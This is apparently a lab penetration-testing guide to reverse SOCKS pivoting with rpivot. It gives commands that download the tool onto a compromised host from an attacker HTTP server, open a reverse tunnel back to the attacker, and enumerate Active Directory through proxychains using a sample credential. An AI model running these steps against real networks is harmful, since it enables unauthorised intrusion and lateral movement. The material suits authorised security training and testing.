# Reverse SOCKS Pivoting via rpivot

## Overview
- **Scenario:** Establishing a pivot into an internal network when outbound SSH access is restricted, credentials are unavailable for SSH tunneling, or SSH dynamic forwarding cannot be initiated from the attacker side.
- **Mechanism:** Reverse SOCKS4 Proxy (**rpivot**).
- **Architecture:** The attacker acts as the listening server; the compromised machine acts as the client and initiates an outbound connection back to the attacker.

---

## 1. When & Why to Use rpivot

While SSH dynamic port forwarding (`ssh -D`) is effective when inbound SSH access and credentials exist, **rpivot** is preferred in alternative scenarios:

| Scenario | SSH Dynamic Port Forwarding (`ssh -D`) | rpivot (Reverse SOCKS) |
| :--- | :--- | :--- |
| **Connection Flow** | Inbound from attacker to target (`Kali -> Target`) | Outbound from target to attacker (`Target -> Kali`) |
| **Credential Dependency** | Requires valid credentials or SSH private key | Operates over any shell session (no credentials needed) |
| **Firewall Evasion** | Inbound ports may be filtered by firewalls | Bypasses restrictive inbound firewalls via egress connections |
| **Protocol** | SOCKS4 / SOCKS5 | SOCKS4 (standard implementation) |

---

## 2. Technical Dependencies & Environment Setup

rpivot is developed in **Python 2.7**. It is incompatible with native Python 3 environments.

### Setting Up a Python 2 Environment (Attacker Workstation)
Modern distributions (such as Kali Linux) run Python 3 by default. Use Conda or pyenv to manage an isolated Python 2 environment:

```bash
# Create and activate a Python 2.7 environment using Conda
conda create -n rpivot python=2.7 -y
conda activate rpivot

# Navigate to the rpivot repository directory
cd /opt/tools/rpivot
```

---

## 3. Step-by-Step Execution Guide

### Step 1: Stage and Transfer rpivot to the Compromised Host
On the Kali workstation (inside your staging directory):
```bash
# Host the zipped repository on an HTTP server
python3 -m http.server 8000
```

On the compromised target machine (via the existing shell session):
```bash
# Navigate to a writable directory
cd /tmp

# Download the archived tool
curl http://10.10.200.2:8000/rpivot.zip --output rpivot.zip

# Extract the archive
unzip rpivot.zip
cd rpivot-master
```

---

### Step 2: Start the rpivot Server (Attacker Machine)
The rpivot server handles two functions:
1. Listens on a designated port (`--server-port`) for the incoming connection from the target client.
2. Spawns a local SOCKS4 proxy listener (`--proxy-port`) on `127.0.0.1` for proxychains to route traffic into.

```bash
# Ensure the Python 2 virtual environment is active
(rpivot) python2 server.py --server-ip 0.0.0.0 --server-port 9980 --proxy-ip 127.0.0.1 --proxy-port 9050
```

- `--server-ip 0.0.0.0`: Listens for incoming client callbacks across all network interfaces (including `tun0`).
- `--server-port 9980`: Port exposed to receive the reverse callback.
- `--proxy-ip 127.0.0.1`: Local IP where the SOCKS proxy will be bound.
- `--proxy-port 9050`: Local port where tools/proxychains will send traffic.

---

### Step 3: Connect the rpivot Client (Target Machine)
From the target shell session, initiate the reverse connection back to the Kali workstation over the VPN IP:

```bash
python2 client.py --server-ip 10.10.200.2 --server-port 9980
```

Once connected, the server terminal prints:
```text
New client connection accepted
Proxy server listening on 127.0.0.1:9050
```

---

### Step 4: Configure Proxychains for SOCKS4

rpivot exposes a **SOCKS4** proxy interface (not SOCKS5). Update `/etc/proxychains4.conf` accordingly:

```bash
sudo nano /etc/proxychains4.conf
```

Scroll to the bottom of the configuration file and adjust the `[ProxyList]` section:

```ini
[ProxyList]
# Comment out previous socks5 tunnels:
# socks5  127.0.0.1  1080

# Add the rpivot SOCKS4 configuration:
socks4    127.0.0.1  9050
```

> **Important Configuration Note:** Because SOCKS4 does not support remote UDP or standard remote DNS resolution like SOCKS5, disable `proxy_dns` if DNS queries fail, or define IP targets directly.

---

## 4. Validating and Pivoting Through rpivot

Route dynamic network commands through `proxychains4` using the active SOCKS4 channel:

```bash
# Verify SMB connectivity to the Domain Controller
proxychains4 nxc smb 192.168.98.2 -u 'employee' -p 'Doctor@963' -d Child

# Query Active Directory via Impacket
proxychains4 impacket-GetADUsers -all -dc-ip 192.168.98.2 'Child.local/employee:Doctor@963'
```

---

## 5. Troubleshooting & Limitations

1. **Python 2 Incompatibility:** If target systems do not have `python2` or `python` symlinked to Python 2.7, evaluate standalone compiled alternatives (such as Chisel, Ligolo-ng, or Gost).
2. **SOCKS4 Protocol Boundaries:** SOCKS4 only supports IPv4 TCP connections. ICMP (ping) and UDP traffic cannot traverse the tunnel.
3. **Connection Drops:** If the connection terminates unexpectedly, ensure firewalls are not enforcing aggressive TCP timeout policies, or restart the server/client pair.